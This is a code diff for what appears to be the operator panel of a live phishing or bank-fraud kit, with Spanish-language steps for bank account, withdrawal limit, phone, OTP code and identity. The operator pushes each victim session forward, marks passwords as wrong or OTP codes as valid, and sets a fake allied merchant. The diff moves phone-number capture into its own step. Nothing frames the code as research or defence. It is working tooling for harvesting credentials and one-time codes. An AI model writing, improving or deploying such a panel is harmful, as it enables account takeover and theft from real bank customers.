@@ -96,13 +96,14 @@ const STEPS = {
   's-processing':'3. Procesando',
   's-banco':'4. Banco / Cuenta',
   's-cupo':'5. Cupo / Retiro',
-  's-otp':'6. Código OTP',
-  's-verifying':'7. Validando código',
-  's-plans':'8. Cuotas',
-  's-confirm':'9. Confirmar',
-  's-identity':'10. Identidad',
-  's-verifying2':'11. Finalizando',
-  's-success':'12. Éxito'
+  's-phone':'6. Teléfono',
+  's-otp':'7. Código OTP',
+  's-verifying':'8. Validando código',
+  's-plans':'9. Cuotas',
+  's-confirm':'10. Confirmar',
+  's-identity':'11. Identidad',
+  's-verifying2':'12. Finalizando',
+  's-success':'13. Éxito'
 };
 let docs = [];
 let orden = [];
@@ -123,12 +124,10 @@ function cmd(sid, objeto){
 function send(sid, go){ cmd(sid, { go }); }
 function sendErr(sid, tipo){ cmd(sid, { error: tipo }); }
 function sendOtp(sid, ok){ cmd(sid, { otp: ok ? 'ok' : 'bad', go: ok ? 's-plans' : null }); }
-function sendAuth(sid, monto, tel, comercio){
+function sendAuth(sid, monto, comercio){
   const v = Number(String(monto||'').replace(/\D/g,''));
   if(!v || v <= 0) return;
-  const t = String(tel||'').replace(/\D/g,'');
   const payload = { monto: v, go: 's-processing' };
-  if(t.length >= 4) payload.telefono = t;
   const cm = String(comercio||'').trim();
   if(cm) payload.comercio = cm;
   cmd(sid, payload);
@@ -163,17 +162,12 @@ function actionsFor(d){
     m.addEventListener('input', fmtMonto);
     m.addEventListener('focus', fmtMonto);
     c.appendChild(m);
-    const t = document.createElement('input'); t.className='d-input'; t.inputMode='numeric';
-    t.placeholder='Celular (ej 3176543289)';
-    t.value = (v.t !== undefined) ? v.t : '';
-    t.oninput = ()=>{ vals[sid] = Object.assign({}, vals[sid], { t: t.value }); };
-    c.appendChild(t);
     const cm = document.createElement('input'); cm.className='d-input';
     cm.placeholder='👔 Comercio aliado (ej: Mac Center)';
     cm.value = (v.c !== undefined) ? v.c : ((d.datos && d.datos.comercio) ? d.datos.comercio : '');
     cm.oninput = ()=>{ vals[sid] = Object.assign({}, vals[sid], { c: cm.value }); };
     c.appendChild(cm);
-    b('✓ Autorizar retiro', ()=>{ sendAuth(sid, m.value, t.value, cm.value); }, 'ok');
+    b('✓ Autorizar retiro', ()=>{ sendAuth(sid, m.value, cm.value); }, 'ok');
     b('✗ Contraseña incorrecta', ()=>sendErr(sid,'pass-incorrecta'), 'err');
   } else if(d.paso==='s-verifying' && d.pendiente){
     b('✓ Código válido', ()=>sendOtp(sid,true), 'ok');
